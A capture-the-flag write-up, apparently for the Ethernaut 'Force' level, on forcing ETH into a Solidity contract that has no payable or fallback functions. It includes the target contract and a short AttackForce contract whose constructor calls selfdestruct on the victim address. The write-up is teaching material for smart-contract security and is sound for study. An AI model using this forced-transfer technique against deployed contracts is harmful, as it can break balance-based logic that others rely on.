Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

-   Fallback methods
-   Sometimes the best way to attack a contract is with another contract.
-   See the Help page above, section "Beyond the console"

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```



**SOLUTION:**

Even if a contract doesn't implement a receive / fallback or any payable functions to handle incoming ETH, it is still possible to forcefully send ETH to a contract through the use of `selfdestruct`. If you're deploying this contract through remix, don't forget to specify value before deploying the AttackForce contract or the `selfdestruct` won't be able to send any ETH over as there are no ETH in the contract to be sent over!

```
pragma solidity ^0.8.0;

contract AttackForce {

    constructor(address payable _victim) payable {
        selfdestruct(_victim);
    }
}
```